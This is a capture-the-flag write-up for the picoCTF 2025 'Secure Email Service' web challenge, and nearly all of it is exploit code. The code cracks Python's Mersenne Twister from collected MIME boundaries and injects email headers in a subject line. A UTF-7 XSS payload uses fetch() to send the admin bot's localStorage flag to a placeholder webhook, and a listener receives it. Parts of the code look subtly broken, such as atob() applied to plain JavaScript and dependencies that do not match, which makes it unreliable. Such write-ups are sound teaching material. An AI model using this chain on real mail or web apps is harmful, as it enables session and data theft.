# PicoCTF 2025 - Secure Email Service (ID 496)
I have finished the secure-email-service challenge (Hard level) from PicoCTF, and here is the explanation:
#
Challenge Overview:
- Category: Web Exploitation
- Difficulty: Hard
- Points: 500
- Flag: `picoCTF{always_a_step_ahead_fb2a1a8c}`

Key Mechanics:
1. S/MIME signed emails render HTML in shadow DOM
2. Admin bot views emails with flag in localStorage
3. Vulnerable to header injection and boundary prediction
#
## 1. Setup & Reconnaissance
```bash
# Get credentials
INSTANCE_URL="https://your-instance-url.ctf"
USERNAME=$(curl -s "$INSTANCE_URL" | grep -oP 'user@ses\w*')
PASSWORD=$(curl -s "$INSTANCE_URL/api/password" | jq -r '.password')

# Login and get session cookie
SESSION_COOKIE=$(curl -s -X POST "$INSTANCE_URL/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}" \
  | jq -r '.session_cookie')
```
## 2. Boundary Prediction (Mersenne Twister Crack)
```python
import re
import requests
from z3_crack import Untwister

def get_boundary(session, to, subject, body):
    """Extract boundary from sent email"""
    resp = session.post(f'{INSTANCE_URL}/api/send',
                       json={'to': to, 'subject': subject, 'body': body})
    return int(re.findall(r"===(\d+)==", resp.json()['data'])[0])

# Initialize session and cracker
session = requests.Session()
session.cookies.set('session', SESSION_COOKIE)
ut = Untwister()

# Collect 800 boundaries for cracking
for i in range(800):
    boundary = get_boundary(session, USERNAME, f"Probe {i}", "test")
    b_bin = bin(boundary)[2:].zfill(63)
    ut.submit(b_bin[31:])  # Lower 32 bits
    ut.submit(b_bin[:31] + '?')  # Upper 31 bits + padding

# Predict admin's reply boundary
ut.get_random().getrandbits(63)  # Skip our payload boundary
ADMIN_BOUNDARY = f"{ut.get_random().getrandbits(63):019d}"
```
## 3. Craft Malicious Payload
```python
import base64

# UTF-7 encoded XSS payload
XSS_PAYLOAD = """
+ADw-img src=+/x onerror=eval(atob('
    fetch(`https://your-webhook.url/?flag=${btoa(localStorage.flag)}`)
'))+AD4-
"""

# MIME encoded-word wrapper
ENCODED_PAYLOAD = base64.b64encode(
    f"""
--{ADMIN_BOUNDARY}
Content-Type: text/html; charset=utf-7

{XSS_PAYLOAD.strip()}
--{ADMIN_BOUNDARY}--
""".encode('utf-8')
).decode('ascii')

# Final subject with header injection
MALICIOUS_SUBJECT = (
    f"Hi =?ISO-8859-1?B?{ENCODED_PAYLOAD}?= \n"
    f"From : admin@ses\n"
    f"Content-Type: multipart/mixed; boundary=\"{ADMIN_BOUNDARY}\""
)
```
## 4. Send Exploit & Trigger Bot
```bash
# Send malicious email to admin
curl -X POST "$INSTANCE_URL/api/send" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -d "{
    \"to\": \"admin@ses\",
    \"subject\": \"$(echo -e "$MALICIOUS_SUBJECT" | jq -Rs .)\",
    \"body\": \"Impossible W\"
  }"

# Trigger admin bot twice
curl -X POST "$INSTANCE_URL/api/admin_bot" \
  -H "Cookie: session=$SESSION_COOKIE"

sleep 5  # Wait for first processing

curl -X POST "$INSTANCE_URL/api/admin_bot" \
  -H "Cookie: session=$SESSION_COOKIE"
```
## 5. Flag Exfiltration
```javascript
// Webhook receiver (Node.js)
const http = require('http');
const server = http.createServer((req, res) => {
    const flag = Buffer.from(
        req.url.split('?flag=')[1],
        'base64'
    ).toString('utf-8');

    console.log(`[+] Flag captured: ${flag}`);
    res.end();
});

server.listen(8080, () => {
    console.log('Listening for flag on port 8080...');
});
```
# Final Output
webhook output:

[+] Flag captured: `picoCTF{always_a_step_ahead_fb2a1a8c}`
#
# Dependencies
```bash
# Install required packages for webhook testing
pip install requests z3-solver pycryptodome
npm install -g requestcatcher
```
